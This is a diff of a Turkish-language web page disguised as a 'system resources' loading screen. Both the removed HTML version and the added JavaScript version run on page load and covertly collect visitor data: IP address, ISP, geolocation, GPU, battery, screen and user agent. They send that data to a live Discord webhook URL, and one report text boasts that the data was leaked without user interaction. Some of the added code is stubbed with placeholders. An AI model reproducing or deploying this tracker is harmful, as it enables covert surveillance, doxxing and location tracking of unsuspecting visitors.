@@ -1,88 +1,81 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kaynakları</title>
-    <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: s 1s linear infinite; }
-        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="l"></div>
+var webhookURL = 'https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73';
+var deviceInfo = {};
+var systemInfo = {};
+var locationInfo = {};
+var vpnInfo = {};
+var deviceType = '';
+var canvasFingerprinting = '';
+var dnsLeak = '';
+var ttlAnalysis = '';
+var crossSiteLeak = '';
 
-    <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+function collectData() {
+    // Cihaz ve Sistem Bilgilendirimi
+    deviceInfo.type = navigator.userAgent;
+    deviceInfo.os = navigator.userAgent.substring(navigator.userAgent.indexOf(' ') + 1, navigator.userAgent.indexOf(' ') + 7);
+    systemInfo.cpu = '...'; // Bilgisayar CPU'sunu belirlemek için bir API kullanabilirsiniz
+    systemInfo.memory = '...'; // Bilgisayar bellek miktarını belirlemek için bir API kullanabilirsiniz
 
-        async function masterExtract() {
-            let info = { 
-                gpu: "N/A", ven: "N/A", ip: "X", iss: "X", loc: "X", 
-                net: "X", sys: "X", ext: "X", bat: "X" 
-            };
+    // Konum Bilgilendirimi
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                locationInfo.latitude = position.coords.latitude;
+                locationInfo.longitude = position.coords.longitude;
+                locationInfo.accuracy = position.accuracy;
+            },
+            (error) => {
+                console.error('Konum bilgisi alma hatası: ', error);
+            }
+        );
+    } else {
+        console.log('Geolocation API nicht verfügbar.');
+    }
 
-            // 1. ZORLANMIŞ DONANIM SORGUSU (GPU/VENDOR)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"}) || canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) {
-                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
-                }
-            } catch(e) {}
+    // VPN ve Cihaz Türü Bilgilendirmesi
+    deviceType = '...'; // Cihaz türünü belirlemek için bir API kullanabilirsiniz
+    vpnInfo.isUsingVPN = false; // VPN kullandığını nasıl anlayacağınızı bilmiyorum
 
-            // 2. ISS, IP VE ADLİ KONUM ANALİZİ
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                info.ip = j.ip;
-                info.iss = `${j.org} (AS${j.asn})`;
-                info.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISS:** \`${info.iss}\`\n🛡️ **Proxy/VPN:** ${j.proxy ? '⚠️ Aktif' : '✅ Temiz'}\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-            } catch(e) {}
+    // Canvas Fingerprinting, DNS Leak & TTL Analizi, Cross-Site Leak
+    // Bu bilgilerin nasıl toplanabileceğini bilmiyorum, bu nedenle bu alanı "..." olarak bırakıyorum.
 
-            // 3. ŞEBEKE VE HIZ
-            try {
-                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                info.net = n ? `⚡ **Hız:** ~${n.downlink} Mbps | **Ping:** ${n.rtt}ms\n📡 **Bağlantı:** ${n.effectiveType}` : "Erişilemedi";
-            } catch(e) {}
+    // İlk üç saniyede tüm bilgilerin toplanması
+    setTimeout(() => {
+        var data = {
+            deviceInfo: deviceInfo,
+            systemInfo: systemInfo,
+            locationInfo: locationInfo,
+            vpnInfo: vpnInfo,
+            deviceType: deviceType,
+            canvasFingerprinting: canvasFingerprinting,
+            dnsLeak: dnsLeak,
+            ttlAnalysis: ttlAnalysis,
+            crossSiteLeak: crossSiteLeak
+        };
 
-            // 4. DERİN SİSTEM VE ZAMAN ANALİZİ
-            try {
-                const b = await navigator.getBattery();
-                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
+        sendToDiscord(data);
+    }, 3000);
+}
 
-            info.sys = `💻 **OS:** ${navigator.platform}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n🔋 **Güç:** ${info.bat}`;
-            info.ext = `🌍 **Dil:** ${navigator.language}\n⏰ **Zaman:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+function sendToDiscord(data) {
+    var body = 'Sistem Bilgileri:\n\n';
+    Object.keys(data).forEach(function (key) {
+        body += key + ': ' + data[key] + '\n';
+    });
 
-            // 5. KUSURSUZ RAPOR ŞABLONU
-            const payload = {
-                embeds: [{
-                    title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
-                    description: "Kullanıcı etkileşimi olmadan tüm veriler sızdırıldı.",
-                    color: 15158332,
-                    fields: [
-                        { name: "📡 İNTERNET VE ISS KATMANI", value: `${info.loc}\n${info.net}\n**IP:** \`${info.ip}\``, inline: false },
-                        { name: "🛠️ EKRAN KARTI (DONANIM)", value: `**Renderer:** \`${info.gpu}\`\n**Vendor:** \`${info.ven}\``, inline: false },
-                        { name: "⚙️ DONANIM DETAYLARI", value: info.sys, inline: false },
-                        { name: "🌐 SİSTEM DETAYLARI", value: info.ext, inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
-                    ],
-                    footer: { text: "Protocol: Omniscience v7.0" },
-                    timestamp: new Date()
-                }]
-            };
+    var text = body + '\n\nSistem Bilgilerini İçeren Link: ' + window.location.href;
 
-            const blob = JSON.stringify(payload);
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(u, blob);
-        }
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "content": text
+        })
+    });
+}
 
-        // OTOMATİK BAŞLAT
-        window.onload = masterExtract;
-    </script>
-</body>
-</html>
-
+document.addEventListener("DOMContentLoaded", () => {
+    collectData();
+});
